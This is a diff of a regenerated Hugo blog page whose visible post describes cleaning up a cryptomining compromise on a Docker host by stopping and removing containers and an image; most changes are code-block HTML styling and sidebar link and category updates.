-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker images | grep alpine</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker images | grep alpine</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="注意-1">注意：</h4>
 <p>一般情况下，挖矿的容器类型与该镜像添加的时间也接近，镜像类型也是一样的</p>
 <h2 id="8停容器">8、停容器</h2>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker stop c083afcd779c</span>
-<span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker stop d241358140a8</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker stop c083afcd779c</span>
+</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker stop d241358140a8</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="注意-2">注意：</h4>
 <p>要找到守护进程和主体进程，清理干净</p>
 <h2 id="9删容器">9、删容器</h2>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker rm c083afcd779c</span>
-<span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker rm d241358140a8</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker rm c083afcd779c</span>
+</span></span><span style="display:flex;"><span><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker rm d241358140a8</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="10删镜像">10、删镜像</h2>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
 </span></code></pre></td>
 <td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker rmi b39e0b392b7e</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#000;font-weight:bold">[</span>root@harbor ~<span style="color:#000;font-weight:bold">]</span><span style="color:#998;font-style:italic"># docker rmi b39e0b392b7e</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="11入侵原因">11、入侵原因</h2>
 <p>容器的入侵途径没 ECS 方便定位，等后续学会了再补充。。。<br>
@@ -575,6 +579,14 @@ b541f979ea7d8ff2ea4f0d2690ce02135174d6ee4995a80d1836d480aecc7c4b   alpine       
 <ul class="widget-list">
     
     <li>
+        <a href="https://anTtutu.github.io/post/2022-04-02-spring_cloud_gateway/" title="SpringCloud GateWay的一些细节注意">SpringCloud GateWay的一些细节注意</a>
+    </li>
+    
+    <li>
+        <a href="https://anTtutu.github.io/post/2022-03-23-linux_backend_execute/" title="linux后台执行可用方式整理">linux后台执行可用方式整理</a>
+    </li>
+    
+    <li>
         <a href="https://anTtutu.github.io/post/2022-03-05-redis_safe/" title="redis日常使用的一些建议">redis日常使用的一些建议</a>
     </li>
     
@@ -606,14 +618,6 @@ b541f979ea7d8ff2ea4f0d2690ce02135174d6ee4995a80d1836d480aecc7c4b   alpine       
         <a href="https://anTtutu.github.io/post/2022-01-06-sdkman/" title="sdkman的使用">sdkman的使用</a>
     </li>
     
-    <li>
-        <a href="https://anTtutu.github.io/post/2021-12-23-mysql_table_clean/" title="mysql大表的数据清理">mysql大表的数据清理</a>
-    </li>
-    
-    <li>
-        <a href="https://anTtutu.github.io/post/2021-12-17-nmap/" title="nmap参数详解">nmap参数详解</a>
-    </li>
-    
 </ul>
     </section>
 
@@ -634,6 +638,8 @@ b541f979ea7d8ff2ea4f0d2690ce02135174d6ee4995a80d1836d480aecc7c4b   alpine       
     <li><a href="https://anTtutu.github.io/categories/arm64/">arm64 (1)</a></li>
     
     <li><a href="https://anTtutu.github.io/categories/awr/">awr (1)</a></li>
+    
+    <li><a href="https://anTtutu.github.io/categories/backend_execute/">backend_execute (1)</a></li>
     
     <li><a href="https://anTtutu.github.io/categories/backup/">backup (1)</a></li>
     
@@ -697,7 +703,7 @@ b541f979ea7d8ff2ea4f0d2690ce02135174d6ee4995a80d1836d480aecc7c4b   alpine       
     
     <li><a href="https://anTtutu.github.io/categories/hugo/">hugo (1)</a></li>
     
-    <li><a href="https://anTtutu.github.io/categories/java/">java (23)</a></li>
+    <li><a href="https://anTtutu.github.io/categories/java/">java (24)</a></li>
     
     <li><a href="https://anTtutu.github.io/categories/jekyll/">jekyll (2)</a></li>
     
@@ -715,7 +721,7 @@ b541f979ea7d8ff2ea4f0d2690ce02135174d6ee4995a80d1836d480aecc7c4b   alpine       
     
     <li><a href="https://anTtutu.github.io/categories/kenlm/">kenlm (1)</a></li>
     
-    <li><a href="https://anTtutu.github.io/categories/linux/">linux (18)</a></li>
+    <li><a href="https://anTtutu.github.io/categories/linux/">linux (19)</a></li>
     
     <li><a href="https://anTtutu.github.io/categories/log/">log (1)</a></li>
     
@@ -766,6 +772,8 @@ b541f979ea7d8ff2ea4f0d2690ce02135174d6ee4995a80d1836d480aecc7c4b   alpine       
     <li><a href="https://anTtutu.github.io/categories/split/">split (1)</a></li>
     
     <li><a href="https://anTtutu.github.io/categories/springboot/">springboot (3)</a></li>
+    
+    <li><a href="https://anTtutu.github.io/categories/springcloud/">springcloud (1)</a></li>
     
     <li><a href="https://anTtutu.github.io/categories/sqlmap/">sqlmap (1)</a></li>
     
